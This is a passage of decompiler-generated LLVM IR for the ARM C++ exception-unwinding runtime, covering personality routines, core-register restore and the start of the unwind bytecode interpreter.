  uselistorder i1 false, { 0, 1, 2, 1195, 1167, 1168, 1165, 1169, 1208, 1209, 1210, 1211, 1212, 1213, 1162, 1163, 1166, 1214, 1215, 1216, 1164, 1196, 1191, 1197, 1198, 1199, 1200, 1201, 1156, 1170, 1171, 1192, 1154, 1186, 1217, 3, 1176, 1177, 1178, 1202, 1172, 1175, 1203, 1204, 1205, 1206, 1207, 1188, 1155, 1158, 1218, 1173, 1159, 1193, 1194, 1179, 1180, 1174, 1183, 1182, 1181, 1184, 1160, 1161, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1185, 1157, 1190, 1187, 1189, 1219, 1220, 1221, 1222 }
  uselistorder i1* @cpsr_z, { 0, 1, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 55, 21, 22, 23, 24, 25, 26, 27, 28, 51, 52, 53, 54, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 50 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_3172c = load i32, i32* @r1, align 4
  %v2_3172c = load i32, i32* @r2, align 4
  %v4_3172c = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_3172c, i32 %v2_3172c, i32 2)
  ret i32 %v4_3172c
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_31734 = load i32, i32* @r1, align 4
  %v2_31734 = load i32, i32* @r2, align 4
  %v4_31734 = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_31734, i32 %v2_31734, i32 1)
  ret i32 %v4_31734
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_3173c = load i32, i32* @r1, align 4
  %v2_3173c = load i32, i32* @r2, align 4
  %v4_3173c = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_3173c, i32 %v2_3173c, i32 0)
  ret i32 %v4_3173c

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 22, 23, 24, 180, 26, 75, 76, 77, 78, 3, 79, 80, 81, 82, 83, 84, 17, 85, 86, 87, 90, 18, 91, 92, 93, 94, 95, 114, 115, 119, 120, 121, 122, 101, 19, 123, 124, 34, 35, 36, 37, 181, 182, 98, 99, 4, 88, 89, 125, 126, 127, 44, 20, 16, 183, 184, 185, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 102, 5, 103, 104, 6, 105, 106, 107, 108, 109, 110, 111, 112, 2, 157, 113, 21, 165, 166, 167, 186, 187, 188, 60, 8, 61, 62, 7, 63, 199, 200, 201, 202, 191, 9, 192, 27, 189, 190, 66, 67, 10, 68, 69, 96, 97, 11, 170, 171, 172, 12, 173, 174, 175, 13, 168, 169, 176, 14, 177, 116, 117, 118, 51, 52, 53, 158, 159, 45, 142, 143, 144, 145, 100, 203, 210, 211, 204, 205, 206, 207, 208, 209, 0, 1, 212, 15, 25, 146, 147, 148, 150, 149, 151, 152, 153, 154, 155, 156, 55, 56, 57, 58, 160, 161, 162, 41, 42, 193, 194, 195, 196, 197, 198, 38, 39, 40, 43, 46, 47, 48, 49, 50, 54, 59, 28, 29, 30, 31, 32, 33, 64, 65, 70, 71, 72, 73, 74, 163, 164, 178, 179 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_31744 = add i32 %tmp, 56
  %v4_31744 = inttoptr i32 %v3_31744 to i32*
  %v5_31744 = load i32, i32* %v4_31744, align 4
  %v6_31744 = add i32 %tmp, 60
  %v7_31744 = inttoptr i32 %v6_31744 to i32*
  %v8_31744 = load i32, i32* %v7_31744, align 4
  %v2_31750 = load i32, i32* %arg1, align 4
  %v3_31750 = add i32 %tmp, 4
  %v4_31750 = inttoptr i32 %v3_31750 to i32*
  %v5_31750 = load i32, i32* %v4_31750, align 4
  store i32 %v5_31750, i32* @r1, align 4
  %v12_31750 = add i32 %tmp, 16
  %v13_31750 = inttoptr i32 %v12_31750 to i32*
  %v14_31750 = load i32, i32* %v13_31750, align 4
  store i32 %v14_31750, i32* @r4, align 4
  %v15_31750 = add i32 %tmp, 20
  %v16_31750 = inttoptr i32 %v15_31750 to i32*
  %v17_31750 = load i32, i32* %v16_31750, align 4
  store i32 %v17_31750, i32* @r5, align 4
  %v18_31750 = add i32 %tmp, 24
  %v19_31750 = inttoptr i32 %v18_31750 to i32*
  %v20_31750 = load i32, i32* %v19_31750, align 4
  store i32 %v20_31750, i32* @r6, align 4
  %v21_31750 = add i32 %tmp, 28
  %v22_31750 = inttoptr i32 %v21_31750 to i32*
  %v23_31750 = load i32, i32* %v22_31750, align 4
  store i32 %v23_31750, i32* @r7, align 4
  %v24_31750 = add i32 %tmp, 32
  %v25_31750 = inttoptr i32 %v24_31750 to i32*
  %v26_31750 = load i32, i32* %v25_31750, align 4
  store i32 %v26_31750, i32* @r8, align 4
  %v27_31750 = add i32 %tmp, 36
  %v28_31750 = inttoptr i32 %v27_31750 to i32*
  %v29_31750 = load i32, i32* %v28_31750, align 4
  store i32 %v29_31750, i32* @sb, align 4
  %v30_31750 = add i32 %tmp, 40
  %v31_31750 = inttoptr i32 %v30_31750 to i32*
  %v32_31750 = load i32, i32* %v31_31750, align 4
  store i32 %v32_31750, i32* @sl, align 4
  store i32 %v8_31744, i32* @ip, align 4
  store i32 %v5_31744, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_31744)
  ret i32 %v2_31750

; uselistorder directives
  uselistorder i32 %v8_31744, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 142, 143, 144, 145, 23, 14, 15, 16, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 69, 74, 75, 76, 77, 79, 80, 78, 81, 5, 82, 6, 83, 84, 85, 86, 87, 17, 18, 12, 7, 148, 146, 147, 63, 64, 65, 66, 67, 68, 42, 88, 89, 103, 130, 131, 38, 11, 39, 105, 104, 1, 106, 107, 2, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 8, 183, 184, 185, 186, 187, 188, 189, 190, 191, 108, 72, 73, 109, 110, 111, 192, 0, 195, 132, 133, 140, 141, 193, 194, 135, 136, 137, 9, 138, 139, 127, 128, 10, 129, 70, 71, 112, 114, 113, 3, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 149, 199, 196, 197, 198, 4, 200, 116, 117, 118, 119, 120, 121, 122, 123, 115, 124, 125, 126, 21, 134, 19, 20, 22, 13 }
  uselistorder i32 40, { 25, 21, 22, 23, 24, 3, 9, 10, 13, 14, 6, 26, 4, 15, 1, 12, 5, 2, 11, 0, 16, 17, 18, 19, 20, 7, 8 }
  uselistorder i32* @sb, { 78, 11, 12, 13, 14, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 42, 30, 31, 32, 1, 33, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 4, 5, 6, 79, 80, 34, 35, 36, 37, 38, 39, 40, 41, 54, 55, 56, 57, 58, 59, 60, 15, 16, 17, 18, 7, 8, 73, 76, 74, 75, 77, 2, 9, 10, 71, 72, 61, 62, 63, 64, 65, 66, 67, 0, 68, 69, 70, 3 }
  uselistorder i32 36, { 26, 6, 25, 4, 14, 15, 18, 19, 20, 21, 22, 16, 8, 12, 9, 27, 0, 1, 2, 5, 17, 10, 3, 23, 24, 7, 13, 11 }
  uselistorder i32* @r8, { 174, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 3, 173, 9, 44, 45, 46, 47, 48, 49, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 71, 77, 91, 92, 93, 94, 95, 96, 4, 97, 98, 99, 100, 101, 102, 20, 21, 22, 175, 176, 72, 73, 5, 74, 75, 76, 103, 104, 105, 106, 107, 108, 109, 110, 10, 78, 79, 80, 81, 11, 82, 83, 84, 85, 86, 87, 88, 89, 90, 111, 0, 112, 113, 65, 6, 66, 67, 68, 69, 70, 50, 51, 52, 53, 23, 24, 25, 12, 39, 40, 41, 42, 43, 26, 27, 28, 14, 15, 7, 16, 13, 139, 140, 141, 142, 143, 8, 144, 145, 146, 147, 148, 149, 150, 151, 35, 36, 37, 38, 152, 153, 154, 155, 131, 132, 133, 134, 129, 130, 114, 115, 116, 117, 118, 119, 120, 2, 121, 1, 122, 123, 124, 125, 17, 18, 126, 127, 128, 135, 136, 137, 138, 29, 30, 31, 32, 33, 34, 19 }
  uselistorder i32 32, { 114, 111, 112, 113, 69, 70, 71, 72, 32, 33, 41, 59, 60, 35, 36, 73, 34, 42, 74, 75, 76, 77, 39, 78, 79, 81, 82, 93, 94, 47, 95, 83, 84, 61, 62, 115, 57, 116, 31, 56, 117, 21, 87, 88, 80, 108, 43, 37, 91, 89, 90, 96, 48, 23, 97, 98, 92, 49, 85, 86, 58, 50, 1, 2, 4, 3, 109, 6, 5, 8, 7, 10, 9, 38, 99, 100, 22, 101, 0, 51, 102, 103, 104, 105, 106, 107, 24, 63, 64, 110, 52, 53, 40, 65, 66, 67, 12, 11, 25, 14, 13, 26, 44, 54, 68, 27, 16, 15, 18, 17, 28, 29, 20, 19, 30, 45, 46, 55 }
  uselistorder i32 28, { 70, 42, 7, 10, 44, 8, 47, 9, 48, 53, 55, 56, 11, 57, 12, 54, 13, 14, 49, 58, 43, 15, 31, 16, 71, 32, 72, 73, 74, 75, 45, 46, 41, 59, 17, 60, 1, 50, 51, 61, 52, 18, 4, 19, 33, 20, 2, 34, 3, 62, 63, 64, 65, 66, 67, 68, 0, 69, 35, 36, 37, 5, 6, 38, 27, 26, 23, 24, 25, 30, 28, 29, 21, 39, 22, 40 }
  uselistorder i32 24, { 62, 61, 4, 12, 32, 36, 38, 39, 0, 49, 5, 50, 40, 41, 16, 17, 63, 13, 14, 64, 42, 43, 37, 51, 1, 47, 44, 45, 46, 33, 34, 52, 48, 15, 35, 18, 19, 20, 21, 22, 31, 2, 53, 54, 55, 56, 57, 58, 59, 60, 23, 24, 25, 26, 27, 28, 29, 9, 10, 8, 11, 3, 6, 7, 30 }
  uselistorder i32 20, { 79, 77, 78, 80, 2, 6, 61, 62, 3, 8, 10, 67, 0, 70, 63, 64, 33, 34, 81, 35, 82, 83, 84, 65, 66, 12, 60, 13, 85, 11, 86, 87, 4, 88, 68, 14, 71, 72, 69, 57, 58, 59, 36, 15, 16, 37, 38, 1, 17, 18, 89, 19, 47, 50, 51, 52, 53, 54, 55, 56, 20, 21, 22, 23, 24, 25, 26, 28, 29, 27, 30, 5, 7, 73, 74, 75, 76, 39, 40, 41, 42, 43, 44, 45, 46, 9, 31, 48, 32, 49 }
  uselistorder i32* @r1, { 199, 22, 23, 24, 2, 200, 84, 85, 13, 86, 87, 88, 89, 90, 14, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 32, 33, 15, 34, 35, 102, 3, 103, 104, 105, 106, 107, 108, 109, 12, 110, 111, 112, 113, 114, 16, 115, 116, 117, 120, 17, 18, 121, 201, 122, 123, 124, 125, 126, 127, 128, 131, 132, 133, 134, 135, 138, 147, 148, 149, 150, 151, 152, 153, 9, 36, 37, 154, 155, 139, 140, 156, 40, 42, 38, 0, 203, 39, 202, 136, 137, 4, 157, 158, 164, 165, 166, 69, 118, 141, 142, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 146, 188, 20, 119, 1, 41, 43, 206, 21, 210, 211, 30, 198, 31, 207, 208, 209, 129, 130, 5, 6, 197, 44, 25, 189, 191, 190, 143, 144, 145, 26, 178, 179, 180, 27, 159, 160, 161, 162, 163, 7, 193, 194, 10, 8, 19, 181, 182, 183, 11, 184, 185, 186, 28, 187, 78, 79, 204, 205, 29, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 80, 81, 82, 83, 192, 195, 196 }
  uselistorder i32 60, { 2, 24, 25, 26, 20, 21, 3, 1, 4, 16, 17, 18, 19, 12, 13, 5, 14, 15, 6, 0, 22, 23, 7, 9, 10, 8, 11 }
  uselistorder i32 56, { 3, 34, 35, 1, 28, 29, 30, 14, 15, 6, 7, 20, 21, 22, 23, 24, 25, 26, 11, 12, 13, 5, 27, 16, 17, 18, 19, 0, 4, 31, 32, 33, 9, 8, 2, 10 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_31760 = load i32, i32* @r0, align 4
  ret i32 %v1_31760
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_31768 = load i32, i32* @r0, align 4
  ret i32 %v1_31768
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_3177c = ptrtoint i32* %stack_var_-68 to i32
  %v2_31780 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_3177c, i32 0)
  ret i32 %v2_31780

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_317a0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_317a4 = call i32 @__gnu_Unwind_Resume(i32 %v2_317a0, i32 0)
  ret i32 %v2_317a4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_317c4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_317c8 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_317c4, i32 0)
  ret i32 %v2_317c8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_317e8 = ptrtoint i32* %stack_var_-68 to i32
  %v6_317ec = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_317e8, i32 %arg2, i8* %arg3, i32 %v2_317e8)
  ret i32 %v6_317ec

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_31818 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_31820 = add i32 %tmp1, 76
  %v2_31820 = inttoptr i32 %v1_31820 to i32*
  %v3_31820 = load i32, i32* %v2_31820, align 4
  %v1_31824 = add i32 %v3_31820, 7
  %v2_31824 = inttoptr i32 %v1_31824 to i8*
  %v3_31824 = load i8, i8* %v2_31824, align 1
  %v4_31824 = zext i8 %v3_31824 to i32
  %v1_31828 = add i32 %v3_31820, 8
  %v3_3182c = mul nuw nsw i32 %v4_31824, 4
  %v2_31830 = add i32 %v3_3182c, %v1_31828
  %v3_31830 = inttoptr i32 %v2_31830 to i8*
  ret i8* %v3_31830
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_31840 = load i32, i32* @r6, align 4
  %v21_31840 = load i32, i32* @lr, align 4
  %v0_31844 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_31844, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_31854

dec_label_pc_31854:                               ; preds = %dec_label_pc_31854.backedge, %entry
  %v3_31860 = phi i32 [ %v0_31854.pre, %dec_label_pc_31854.backedge ], [ %tmp, %entry ]
  %v1_31854 = add i32 %v3_31860, 8
  %v2_31854 = inttoptr i32 %v1_31854 to i8*
  %v3_31854 = load i8, i8* %v2_31854, align 1
  %v4_31854 = zext i8 %v3_31854 to i32
  store i32 %v4_31854, i32* %r3.global-to-local, align 4
  %v2_31858 = icmp eq i8 %v3_31854, 0
  store i1 %v2_31858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31858, label %dec_label_pc_31868, label %.thread

.thread:                                          ; preds = %dec_label_pc_31854
  %v2_3185c = add nsw i32 %v4_31854, -1
  store i32 %v2_3185c, i32* %r3.global-to-local, align 4
  %v2_31860 = trunc i32 %v2_3185c to i8
  store i8 %v2_31860, i8* %v2_31854, align 1
  %v0_31864.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31864.pr.pr, label %.thread.dec_label_pc_31868_crit_edge, label %dec_label_pc_31890

.thread.dec_label_pc_31868_crit_edge:             ; preds = %.thread
  %v0_31868.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31868

dec_label_pc_31868:                               ; preds = %.thread.dec_label_pc_31868_crit_edge, %dec_label_pc_31854
  %v0_31868 = phi i32 [ %v0_31868.pre, %.thread.dec_label_pc_31868_crit_edge ], [ %v3_31860, %dec_label_pc_31854 ]
  %v1_31868 = add i32 %v0_31868, 9
  %v2_31868 = inttoptr i32 %v1_31868 to i8*
  %v3_31868 = load i8, i8* %v2_31868, align 1
  %v4_31868 = zext i8 %v3_31868 to i32
  store i32 %v4_31868, i32* %r3.global-to-local, align 4
  %v2_3186c = icmp eq i8 %v3_31868, 0
  store i1 %v2_3186c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_3186c, label %dec_label_pc_31970, label %dec_label_pc_31874

dec_label_pc_31874:                               ; preds = %dec_label_pc_31964, %dec_label_pc_31868
  %v2_31878 = phi i32 [ %v0_31964, %dec_label_pc_31964 ], [ %v0_31868, %dec_label_pc_31868 ]
  %v0_31874 = phi i32 [ %v4_31964, %dec_label_pc_31964 ], [ %v4_31868, %dec_label_pc_31868 ]
  %v1_31874 = add nsw i32 %v0_31874, -1
  store i32 %v1_31874, i32* %r3.global-to-local, align 4
  %v1_31878 = trunc i32 %v1_31874 to i8
  %v3_31878 = add i32 %v2_31878, 9
  %v4_31878 = inttoptr i32 %v3_31878 to i8*
  store i8 %v1_31878, i8* %v4_31878, align 1
  %v0_3187c = load i32, i32* @r5, align 4
  %v1_3187c = add i32 %v0_3187c, 4
  %v2_3187c = inttoptr i32 %v1_3187c to i32*
  %v3_3187c = load i32, i32* %v2_3187c, align 4
  store i32 %v3_3187c, i32* %r2.global-to-local, align 4
  %v1_31880 = inttoptr i32 %v3_3187c to i32*
  %v2_31880 = load i32, i32* %v1_31880, align 4
  store i32 %v2_31880, i32* %r0.global-to-local, align 4
  %v4_31880 = add i32 %v3_3187c, 4
  store i32 %v4_31880, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_31888 = inttoptr i32 %v0_3187c to i32*
  store i32 %v2_31880, i32* %v1_31888, align 4
  %v5_31888 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_31888, i32* %v2_3187c, align 4
  %v0_3188c = load i32, i32* %r3.global-to-local, align 4
  %v1_3188c = trunc i32 %v0_3188c to i8
  %v2_3188c = load i32, i32* @r5, align 4
  %v3_3188c = add i32 %v2_3188c, 8
  %v4_3188c = inttoptr i32 %v3_3188c to i8*
  store i8 %v1_3188c, i8* %v4_3188c, align 1
  br label %dec_label_pc_31890

dec_label_pc_31890:                               ; preds = %.thread, %dec_label_pc_31874, %.thread6
  %v0_31890 = load i32, i32* @r5, align 4
  %v1_31890 = inttoptr i32 %v0_31890 to i32*
  %v2_31890 = load i32, i32* %v1_31890, align 4
  %v3_31894 = udiv i32 %v2_31890, 16777216
  store i32 %v3_31894, i32* @r4, align 4
  store i32 %v3_31894, i32* %ip.global-to-local, align 4
  %v3_3189c = mul i32 %v2_31890, 256
  store i32 %v3_3189c, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_31890, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_3189c, i32* %v1_31890, align 4
  br i1 %tmp183, label %dec_label_pc_31970, label %dec_label_pc_318ac

dec_label_pc_318ac:                               ; preds = %dec_label_pc_31890
  %v0_318ac = load i32, i32* @r4, align 4
  %v1_318ac = and i32 %v0_318ac, 128
  store i32 %v1_318ac, i32* %r1.global-to-local, align 4
  %v2_318ac = icmp eq i32 %v1_318ac, 0
  store i1 %v2_318ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_318ac, label %dec_label_pc_31988, label %dec_label_pc_318b4

dec_label_pc_318b4:                               ; preds = %dec_label_pc_318ac
  %v1_318b4 = and i32 %v0_318ac, 240
  store i32 %v1_318b4, i32* @r6, align 4
  %v7_318b8 = icmp eq i32 %v1_318b4, 128
  store i1 %v7_318b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_318b8, label %dec_label_pc_318c0, label %dec_label_pc_319e4

dec_label_pc_318c0:                               ; preds = %dec_label_pc_318b4
